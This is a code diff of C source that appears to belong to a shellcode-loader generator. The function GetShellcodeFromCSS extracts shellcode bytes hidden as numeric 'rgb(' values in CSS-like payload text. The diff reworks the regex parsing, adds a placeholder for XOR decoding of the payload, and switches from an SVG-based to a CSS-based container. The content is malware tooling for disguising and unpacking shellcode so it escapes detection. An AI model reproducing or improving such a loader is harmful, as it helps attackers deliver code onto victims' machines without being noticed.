@@ -2,6 +2,7 @@
 #define PCRE2_STATIC
 #include <pcre2.h>
 #include <string.h>
+#include <stdio.h>
 #include <windows.h>
 
 ###PAYLOAD###
@@ -35,8 +36,8 @@ struct cssdata * GetShellcodeFromCSS()
   int count = 0;
   memset(holder, 0, sz);
 
-  char* temp = (char*)malloc(5);
-  memset(temp, '\0', 5);    
+  char* temp = (char*)malloc(10);
+  memset(temp, '\0', 10);    
   for (int line = 0; line < sz; ++line)
   {  
 
@@ -65,7 +66,7 @@ struct cssdata * GetShellcodeFromCSS()
 
     find_all = 1;
 
-    pattern = (PCRE2_SPTR)"\"\\rgb\((d{1,3}),\"";
+    pattern = (PCRE2_SPTR)"rgb\\((\\d{1,3}),";
     subject = (PCRE2_SPTR)payload[line];
     subject_length = strlen((char *)subject);
 
@@ -168,15 +169,13 @@ struct cssdata * GetShellcodeFromCSS()
       {
         PCRE2_SPTR substring_start = subject + ovector[2*i];
         size_t substring_length = ovector[2*i+1] - ovector[2*i];
-        //sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
-        printf("%.*s", (int)substring_length, (char *)substring_start);
+        sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
       }
     }
 
-    // remove the "cm"
-    strremove(temp, "cm");
-    // Remove quote
-    strremove(temp, "\"");
+    // remove the "rgb bit"
+    strremove(temp, "rgb(");
+    strremove(temp, ",");
 
     int intVal = atoi(temp);
 
@@ -197,7 +196,9 @@ struct cssdata * GetShellcodeFromCSS()
         shellcode[i] = (unsigned char)holder[i];
     }
 
-    struct svgdata* d = malloc(sizeof(struct svgdata));
+    ###XOR_LOGIC###
+
+    struct cssdata* d = malloc(sizeof(struct cssdata));
     d->shellcode = malloc(count);
     memcpy(d->shellcode, shellcode, count);
     d->size = count;
